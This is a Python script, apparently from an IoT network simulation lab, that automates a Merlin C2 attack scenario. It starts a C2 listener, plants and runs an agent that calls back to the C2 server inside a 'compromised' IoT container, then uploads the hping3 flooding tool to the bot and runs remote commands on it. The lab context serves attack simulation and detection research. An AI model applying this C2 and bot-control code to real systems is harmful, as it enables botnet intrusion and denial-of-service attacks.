import re
import time
import docker
from telnetlib import Telnet
import sys; from pathlib import Path; sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))
from gns3utils import *


def start_merlin_cnc_listener(hostname: str, telnet_port: int, sleep_time: float = 2) -> None:
    """ Start merlin listener.
    In the Merlin interactive console run:
    - listeners
    - use https
    - set Interface 0.0.0.0
    - start
    """
    with Telnet(hostname, telnet_port) as tn:
        print(tn.read_very_eager().decode("utf-8"))
        tn.write(b"listeners\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))
        tn.write(b"use https\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))
        tn.write(b"set Interface 0.0.0.0\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))
        tn.write(b"start\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))
        tn.write(b"info\n")
        time.sleep(sleep_time * 3)
        print(tn.read_very_eager().decode("utf-8"))
        tn.write(b"back\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))
        tn.write(b"back\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))


def list_merlin_cnc_connected_bots(hostname: str, telnet_port: int, sleep_time: float = 2) -> str:
    with Telnet(hostname, telnet_port) as tn:
        print(tn.read_very_eager().decode("utf-8"))
        tn.write(b"agent list\n")
        time.sleep(sleep_time)
        agents_table = tn.read_very_eager().decode("utf-8")
        print(agents_table)
        return agents_table


def parse_agent_table(agent_table):
    agents = []
    uuidre = re.compile("([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})")
    for line in agent_table.split("\n"):
        line = line.strip()
        match = re.search(uuidre, line)
        if match:
            agents.append((match.group(1), line))
    return agents


def merlin_cnc_tool_transfer_agent(hostname: str, telnet_port: int, agent_id: str, sleep_time: float = 2) -> None:
    with Telnet(hostname, telnet_port) as tn:
        print(tn.read_very_eager().decode("utf-8"))
        tn.write(f"agent interact {agent_id}\n".encode("ascii"))
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))
        tn.write(b"upload /opt/hping3/hping3-static /opt/hping3\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))
        tn.write(b"back\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))


def merlin_cnc_remote_cmd_agent(hostname: str, telnet_port: int, agent_id: str, cmd: str, sleep_time: float = 2) -> None:
    with Telnet(hostname, telnet_port) as tn:
        print(tn.read_very_eager().decode("utf-8"))
        tn.write(f"agent interact {agent_id}\n".encode("ascii"))
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))
        tn.write(f"run {cmd}\n".encode("ascii"))
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))
        tn.write(b"back\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))


def deploy_and_exec_merlin_agent(bot_container, cnc_addr: str = "192.168.34.10", cnc_port: int = 443, cnc_sleep: int = 20):
    # Asegurar que el directorio y binario existan
    bot_container.exec_run("mkdir -p /opt/merlin")
    check_bin = bot_container.exec_run("test -f /opt/merlin/merlinAgent-Linux-x64")
    if check_bin.exit_code != 0:
        # Copiar binario desde imagen merlin-cnc
        import subprocess
        print(f"[*] Copiando merlinAgent al contenedor {bot_container.name}...")
        subprocess.run(["docker", "run", "--rm", "--entrypoint", "cat", "iotsim/merlin-cnc:latest", "/opt/merlin/merlinAgent-Linux-x64"],
                       stdout=open("/tmp/merlinAgent", "wb"), check=True)
        subprocess.run(["docker", "cp", "/tmp/merlinAgent", f"{bot_container.id}:/opt/merlin/merlinAgent-Linux-x64"], check=True)
        bot_container.exec_run("chmod +x /opt/merlin/merlinAgent-Linux-x64")
    
    print(f"[*] Ejecutando merlinAgent en {bot_container.name} conectando a https://{cnc_addr}:{cnc_port}...")
    bot_container.exec_run(f"/opt/merlin/merlinAgent-Linux-x64 -url https://{cnc_addr}:{cnc_port} -sleep {cnc_sleep}s", detach=True)


if __name__ == "__main__":
    PROJECT_NAME = "gotham_scenario"
    check_local_gns3_config()
    server = Server(*read_local_gns3_config())
    project = get_project_by_name(server, PROJECT_NAME)

    docker_client = docker.from_env()
    docker_client.ping()

    all_iot = get_nodes_id_by_name_regexp(server, project, re.compile("iotsim-.*", re.IGNORECASE))
    merlin_cnc = next(filter(lambda i: i.name == "iotsim-merlin-cnc-1", all_iot))
    
    print("[*] Asegurando que iotsim-merlin-cnc-1 este iniciado...")
    start_node(server, project, merlin_cnc.id)
    time.sleep(3)
    
    merlin_cnc_h, merlin_cnc_p = get_node_telnet_host_port(server, project, merlin_cnc.id)
    start_merlin_cnc_listener(merlin_cnc_h, merlin_cnc_p)

    # Seleccionar el bot (preferir 'compromised' si existe, sino seleccionar building-monitor-1)
    bot_node = next(filter(lambda i: "compromised" in i.name, all_iot), None)
    if not bot_node:
        bot_node = next(filter(lambda i: i.name == "iotsim-building-monitor-1", all_iot))
        print(f"[*] Usando dispositivo IoT de la ciudad como bot: {bot_node.name}")
    
    container_bot = docker_client.containers.get(get_node_docker_container_id(server, project, bot_node.id))
    deploy_and_exec_merlin_agent(container_bot, "192.168.34.10", 443, 20)
    
    print("[*] Esperando 30s a que el agente registre comunicacion con el C2...")
    time.sleep(30)

    agent_list = parse_agent_table(list_merlin_cnc_connected_bots(merlin_cnc_h, merlin_cnc_p))
    print(f"[*] Agentes conectados: {len(agent_list)}")
    if agent_list:
        agent_id = agent_list[0][0]
        print(f"[*] Transfiriendo hping3 al agente {agent_id}...")
        merlin_cnc_tool_transfer_agent(merlin_cnc_h, merlin_cnc_p, agent_id)
        time.sleep(15)
        print(f"[*] Asignando permisos de ejecucion a hping3...")
        merlin_cnc_remote_cmd_agent(merlin_cnc_h, merlin_cnc_p, agent_id, "chmod 775 /opt/hping3")
        print("[+] Ataque Merlin C2 y control de bot completado exitosamente!")
    else:
        print("[-] Advertencia: El agente no aparecio en la lista en los primeros 30s.")
